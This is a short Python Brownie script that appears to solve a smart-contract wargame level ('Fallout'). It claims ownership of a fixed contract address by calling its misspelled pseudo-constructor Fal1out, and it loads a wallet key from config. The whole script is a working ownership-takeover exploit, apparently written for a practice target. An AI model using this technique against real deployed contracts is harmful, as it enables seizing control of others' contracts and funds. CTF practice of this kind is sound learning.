from brownie import interface, accounts, config

INSTANCE_ADDRESS = "0x321940c2dFbCb2aff957B3bC99936B844EF03a36"
ACCOUNT = accounts.add(config["wallets"]["from_key"])

def hack():
    instance_contract = interface.IFallout(INSTANCE_ADDRESS)
    instance_contract.Fal1out({"from": ACCOUNT, "value": 0.000000000000000001})
    print(f"Contract has been hacked. The new owner now is {instance_contract.owner()}")

def main():
    hack()
